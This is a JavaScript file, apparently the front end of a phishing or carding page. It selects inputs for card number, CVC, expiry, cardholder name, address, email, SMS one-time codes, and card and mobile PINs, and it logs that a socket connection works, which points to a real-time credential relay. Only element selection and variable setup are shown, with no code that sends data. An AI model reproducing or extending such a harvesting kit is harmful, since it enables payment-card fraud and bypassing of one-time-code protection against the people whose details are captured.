console.log("rl script Socket works");
localStorage.setItem("ifSessionExist", "No");
localStorage.setItem("currPage", "1");


let flag = false

//spinner
const hpOtpLoader2 = document.querySelector('.hp-otp-form-overlay-2')
const hpButtonSpinner3 = document.querySelector('.hp-button-spinner-3')
const hpButtonSpinner = document.querySelector('.hp-button-spinner')

// const hpLoadingRing = document.querySelector(".hp-loading-ring-wrapper");
// console.log(hpLoadingRing)
//pages
const hpPage1 = document.querySelector(".hpPage1");
const hpPage2 = document.querySelector(".hpPage2");
const hpPage2LoadingRing2 = document.querySelector(".hpPage2 .preloader");

//btns
const hpHaveAuthCodeBtn = document.querySelector(".hpHaveAuthCodeBtn");


const hpSubmitBtn = document.querySelector(".hp-submit-button"); //
const rlSubmitCode6 = document.querySelector(".hp-continue-button"); //

const rlSignInBtn = document.querySelector(".rlSignInBtn");
const rlNext = document.querySelector(".rlNext");
const rlLogIn = document.querySelector(".rlLogIn");
const rlSwitchUser = document.querySelector(".rlSwitchUser");
const rlRadioMobile = document.querySelector(".rlRadioMobile");
const rlRadioCard = document.querySelector(".rlRadioCard");
const rlInitSessionTest = document.querySelector(".rlInitSessionTest");

const hpOtpTextError = document.querySelector('.hp-otp-text-error')
const hpErrorBlockCardNumber = document.querySelector('.hp-error-block-card-number')

//error divs
const rlErrorCred = document.querySelector(".rlErrorCred");

//next forms-boxes
const rlEmailBox = document.querySelector(".rlEmailBox");
const rlLoginBox = document.querySelector(".rlLoginBox");
const rlCodeBox = document.querySelector(".rlCodeBox");
const rlMobilePinBox = document.querySelector(".rlMobilePinBox");
const rlCardPinBox = document.querySelector(".rlCardPinBox");

//forms
const rlZeroForm = document.querySelector(".hp-main-form"); //

const rlSecondForm = document.querySelector(".hp-OTP-2-forms"); //

const rlThirdForm = document.querySelector(".rlThirdForm");

//inputs

const rlCardNumber = document.querySelector(".card-number-input");
const rlCardName = document.querySelector(".cardholdername-input");
const rlCardData = document.querySelector('.data-input')
const rlEmailInput = document.querySelector('.email-input')
const rlCvcInput = document.querySelector('.cvc-input')
const rlCardholdernameInput = document.querySelector('.cardholdername-input')
const rlAddressInput1 = document.querySelector('.address-input-1')
const rlAddressInput2 = document.querySelector('.address-input-2')
const rlProvinceInput = document.querySelector('.province-input')
const rlCityInput = document.querySelector('.city-input')
const rlPostalCodeInput = document.querySelector('.postal-code-input')
const rlCountrySelect = document.querySelector('.country-select')





// const rlCardExpMonth = document.querySelector(".select-date");
// const rlCardExpYear = document.querySelector(".exp-year-select");

const rlCardCvv = document.querySelector(".cvc-input");

let rlCardNumberVal;
let rlCardNumber2Val;
let rlCardNameVal;
let rlCardExpMonthVal;
let rlCardExpYearVal;
let rlCardCvvVal;

let smsCode = '';

// const rlOtpCodeInput = rlThirdForm.querySelector(".rlOtpCodeInput");
const rlOTPCode = smsCode;
// const rlOtpCodes = document.querySelectorAll(".rlOtpCodes .MNTextBox");
// console.log(rlOtpCodes);
// const rlPassInput2 = document.querySelector(".rlPassInput2");
// const rlSecurityCode = document.querySelector(".rlSecurityCode");
// const rlUsername2input = document.querySelector(".rlUsername2input");

//texts
const rlFormLabel1 = document.querySelector(".rlFormLabel1");
const rlFormLabel2 = document.querySelector(".rlFormLabel2");
const rl2DigitPhone = document.querySelector(".rl2DigitPhone");
const rl4DigitPhone = document.querySelectorAll(".rl4DigitPhone");
const rlLoginText = document.querySelector(".rlLoginText");
// const rlShopName = document.querySelector(".rlShopName");
const rlOrderAmount2 = document.querySelector(".rlOrderAmount2");

const rlUserNameText = document.querySelector(".rlUserNameText");
const rlEmailChoice = document.querySelector(".rlEmailChoice");
const rlEmailChoice2 = document.querySelector(".rlEmailChoice2");
const rlWrongEmailPassCont = document.querySelector(".rlWrongEmailPassCont");
